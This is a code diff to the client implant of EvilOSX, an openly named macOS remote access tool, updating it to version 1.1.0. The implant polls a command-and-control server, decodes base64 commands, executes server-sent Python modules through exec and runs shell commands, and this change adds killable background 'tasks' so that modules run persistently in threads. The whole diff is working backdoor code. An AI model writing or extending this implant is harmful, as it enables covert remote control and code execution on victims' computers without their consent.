@@ -4,7 +4,7 @@
 # Random Hash: This text will be replaced when building EvilOSX.
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "1.0.0"
+__version__ = "1.1.0"
 
 import time
 import urllib2
@@ -99,23 +99,27 @@ def receive_command():
         else:
             json_response = json.loads(response_line)
 
+            log.debug("Raw command JSON: %s", str(json_response))
+
             # Parse the JSON response into a command object.
             return Command(json_response["id"], base64.b64decode(json_response["command"]),
-                           json_response["module_name"])
+                           json_response["module_name"], True if json_response["is_task"] == 1 else False)
 
 
 class Command:
     """This class represents a command sent by the server."""
 
-    def __init__(self, client_id, command, module_name=""):
+    def __init__(self, client_id, command, module_name="", is_task=False):
         """
         :param client_id The ID of the client which should execute this command.
         :param command The command (or module code) to execute on the client.
         :param module_name The name of the module being executed.
+        :param is_task True if this module is a task.
         """
         self.id = client_id
         self.command = command
         self.module_name = module_name
+        self.is_task = is_task
 
 
 def get_uid():
@@ -183,6 +187,7 @@ def run_module(module_code):
     """Executes a module sent by the server.
 
     :return The module's output.
+    :type module_code str
     """
     try:
         new_stdout = StringIO()
@@ -196,7 +201,7 @@ def run_module(module_code):
         sys.stderr = new_stderr
 
         exec module_code in globals()
-        # TODO - Find a way to remove the executed code from globals.
+        # TODO - Find a way to remove the executed code from globals, probably won't happen though.
 
         # Restore output.
         sys.stdout = old_stdout
@@ -205,8 +210,45 @@ def run_module(module_code):
         response = new_stdout.getvalue() + new_stderr.getvalue()
     except Exception:
         response = MESSAGE_ATTENTION + "Error executing module: " + traceback.format_exc()
-
     return response
+
+
+class KillableThread(threading.Thread):
+    """Subclass of threading.Thread with a kill() method.
+
+    See https://mail.python.org/pipermail/python-list/2004-May/281944.html
+    """
+
+    def __init__(self, *args, **keywords):
+        threading.Thread.__init__(self, *args, **keywords)
+        self.killed = False
+
+    def start(self):
+        """Start the thread."""
+        self.__run_backup = self.run
+        self.run = self.__run  # Force the thread to install our trace.
+        threading.Thread.start(self)
+
+    def __run(self):
+        """Hacked run function which installs the trace."""
+        sys.settrace(self.globaltrace)
+        self.__run_backup()
+        self.run = self.__run_backup
+
+    def globaltrace(self, frame, why, arg):
+        if why == "call":
+            return self.localtrace
+        else:
+            return None
+
+    def localtrace(self, frame, why, arg):
+        if self.killed:
+            if why == "line":
+                raise SystemExit()
+        return self.localtrace
+
+    def kill(self):
+        self.killed = True
 
 
 def send_response(response, module_name=""):
@@ -328,6 +370,7 @@ def main():
     """Main program loop."""
     last_active = time.time()  # The last time a command was requested from the server.
     idle = False
+    tasks = []  # List of tuples containing the task name and thread.
 
     if os.path.dirname(os.path.realpath(__file__)).lower() != get_program_directory().lower():
         if not DEVELOPMENT:
@@ -340,6 +383,9 @@ def main():
             command = receive_command()
 
             if command:
+                if idle:
+                    log.info("Switching from idle back to normal mode...")
+
                 last_active = time.time()
                 idle = False
 
@@ -347,7 +393,37 @@ def main():
                     # Run a module.
                     log.info("Running module: %s", command.module_name)
 
-                    send_response(run_module(command.command), command.module_name)
+                    if command.command.startswith("kill_task"):
+                        log.info("Attempting to kill task \"%s\"..." % command.module_name)
+                        found_task = False
+
+                        for task in tasks:
+                            task_name, task_thread = task
+
+                            if task_name != command.module_name:
+                                continue
+                            else:
+                                found_task = True
+                                task_thread.kill()
+                                tasks.remove(task)
+
+                                log.info("Task stopped.")
+                                send_response("Task stopped.")
+                                break
+
+                        if not found_task:
+                            log.info("Failed to find running task.")
+                            send_response("Failed to find running task.")
+                    elif command.is_task:
+                        log.info("This module is a task, running in separate thread...")
+
+                        task_thread = KillableThread(target=run_module, args=(command.command,))
+                        task_thread.daemon = True
+                        task_thread.start()
+
+                        tasks.append((command.module_name, task_thread))
+                    else:
+                        send_response(run_module(command.command), command.module_name)
                 else:
                     # Run a system command.
                     log.info("Running command: %s", command.command)
